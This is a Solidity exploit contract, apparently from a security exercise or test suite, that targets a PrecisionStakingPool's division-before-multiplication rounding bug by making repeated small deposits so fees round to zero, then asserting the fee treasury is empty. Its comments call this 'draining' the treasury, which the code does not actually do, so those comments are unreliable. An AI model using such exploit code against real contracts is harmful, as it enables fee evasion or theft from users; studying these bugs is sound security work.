// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {PrecisionStakingPool} from "../src/PrecisionStakingPool.sol";

contract ExploitModule {
    PrecisionStakingPool public targetContract;

    constructor(address _target) payable {
        targetContract = PrecisionStakingPool(payable(_target));
    }

    function runExploit() external payable {
        // Deposit a small amount to ensure fee calculation results in zero
        // This exploits the division before multiplication bug
        uint256 smallAmount = 1e17; // 0.1 ether
        
        // Deposit multiple small amounts to drain the fee treasury
        for (uint i = 0; i < 10; i++) {
            targetContract.depositWithFee{value: smallAmount}();
        }
        
        // Check if the fee treasury is drained
        require(address(targetContract).balance > 0, "Fee treasury should have funds");
        require(targetContract.poolFeeTreasury() == 0, "Fee treasury should be empty");
    }

    receive() external payable {}
}